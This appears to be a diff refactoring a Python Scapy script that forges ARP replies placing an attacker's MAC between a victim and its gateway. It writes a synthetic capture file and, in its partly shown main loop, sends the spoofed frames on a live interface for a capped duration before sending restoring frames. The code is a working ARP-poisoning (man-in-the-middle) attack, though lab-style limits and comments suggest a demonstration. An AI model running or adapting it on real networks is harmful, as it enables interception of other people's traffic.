@@ -14,9 +14,9 @@ def reply(destination_mac, destination_ip, claimed_ip, claimed_mac):
         hwdst=destination_mac, pdst=destination_ip)
 
 
-def poison_packets():
-    return [reply(VICTIM_MAC, VICTIM_IP, GATEWAY_IP, ATTACKER_MAC),
-            reply(GATEWAY_MAC, GATEWAY_IP, VICTIM_IP, ATTACKER_MAC)]
+def claims(gateway_mac, victim_mac):
+    return [reply(VICTIM_MAC, VICTIM_IP, GATEWAY_IP, gateway_mac),
+            reply(GATEWAY_MAC, GATEWAY_IP, VICTIM_IP, victim_mac)]
 
 
 def main():
@@ -27,9 +27,8 @@ def main():
     args = parser.parse_args()
     if not 1 <= args.duration <= 60:
         parser.error("Duration must be between 1 and 60 seconds.")
-    poison = poison_packets()
-    restore = [reply(VICTIM_MAC, VICTIM_IP, GATEWAY_IP, GATEWAY_MAC),
-               reply(GATEWAY_MAC, GATEWAY_IP, VICTIM_IP, VICTIM_MAC)]
+    poison = claims(ATTACKER_MAC, ATTACKER_MAC)
+    restore = claims(GATEWAY_MAC, VICTIM_MAC)
     # Synthetic sequence: true binding -> conflicting claim -> true binding restored.
     wrpcap("arp-demo.pcap", [restore[0], *poison, *restore])
     print("Wrote arp-demo.pcap: synthetic ARP sequence, not intercepted traffic.")
@@ -42,8 +41,9 @@ def main():
                 time.sleep(1)
         finally:
             # Keep the bridge from learning genuine peer MACs on the attacker port.
-            corrections = [Ether(src=ATTACKER_MAC, dst=p[Ether].dst) / p[ARP] for p in restore]
-            sendp(corrections, iface=args.interface, count=3, inter=0.2, verbose=False)
+            for frame in restore:
+                frame.src = ATTACKER_MAC
+            sendp(restore, iface=args.interface, count=3, inter=0.2, verbose=False)
 
 
 if __name__ == "__main__":
